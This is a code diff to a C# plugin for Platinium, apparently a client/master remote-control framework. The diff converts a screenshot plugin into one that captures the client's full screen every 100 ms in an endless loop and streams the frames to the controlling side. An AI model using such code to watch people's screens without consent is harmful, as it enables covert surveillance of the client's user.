@@ -1,6 +1,7 @@
-﻿using Platinium.Shared.Data.Packages;
+﻿using Platinium.Shared.Data.Network;
+using Platinium.Shared.Data.Packages;
 using Platinium.Shared.Plugin;
-using PluginScreenshot2;
+using PluginVideo;
 using System;
 using System.Collections.Generic;
 using System.Drawing;
@@ -10,16 +11,18 @@ using System.Reflection;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
+using System.Windows.Controls;
 using System.Windows.Forms;
+using System.Windows.Shapes;
 
-[Metadata(Name = "Screenshot", Version = "2", Description = "Takes screenshots")]
+[Metadata(Name = "Video", Version = "1", Description = "Takes videos")]
 public class Plugin : IPluginImplementation
 {
     public dynamic Interface { get; set; }
 
     public PluginClientController ClientController { get; set; }
     public PluginMasterController MasterController { get; set; }
-    public UserControl PluginInterface { get; set; }
+    public System.Windows.Forms.UserControl PluginInterface { get; set; }
 
     public Plugin(dynamic obj)
     {
@@ -40,18 +43,23 @@ public class PluginClientSide : PluginClientController
 {
     public Package Action(Package inPackage)
     {
-        byte[] imageBytes = null;
-        Rectangle bounds = Screen.GetBounds(Point.Empty);
-        using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
+        while (true)
         {
-            using (Graphics g = Graphics.FromImage(bitmap))
+            byte[] imageBytes = null;
+            System.Drawing.Rectangle bounds = Screen.GetBounds(Point.Empty);
+            using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
             {
-                g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                using (Graphics g = Graphics.FromImage(bitmap))
+                {
+                    g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
+                }
+                ImageConverter converter = new ImageConverter();
+                imageBytes = (byte[])converter.ConvertTo(bitmap, typeof(byte[]));
             }
-            ImageConverter converter = new ImageConverter();
-            imageBytes = (byte[])converter.ConvertTo(bitmap, typeof(byte[]));
+            Thread.Sleep(100);
+            NetworkManagement.WriteData(NetworkManagement.NetworkStream, new Package(inPackage.Command, imageBytes, Platinium.Shared.Content.PackageType.PluginCommand, inPackage.To, inPackage.From, null));
         }
-        return new Package(inPackage.Command, imageBytes, Platinium.Shared.Content.PackageType.PluginCommand, inPackage.To, inPackage.From, null);
+        return null;
     }
 }
 public class PluginMasterSide : PluginMasterController
@@ -69,11 +77,12 @@ public class PluginMasterSide : PluginMasterController
         IsInUse = true;
         if (isOpen)
         {
-            pictureForm.RefreshImage(Image.FromStream(new MemoryStream((byte[])inPackage.Content)));
-        } else
+            pictureForm.RefreshImage(System.Drawing.Image.FromStream(new MemoryStream((byte[])inPackage.Content)));
+        }
+        else
         {
             isOpen = true;
-            pictureForm.RefreshImage(Image.FromStream(new MemoryStream((byte[])inPackage.Content)));
+            pictureForm.RefreshImage(System.Drawing.Image.FromStream(new MemoryStream((byte[])inPackage.Content)));
             Thread mThread = new Thread(delegate ()
             {
                 pictureForm.ShowDialog();
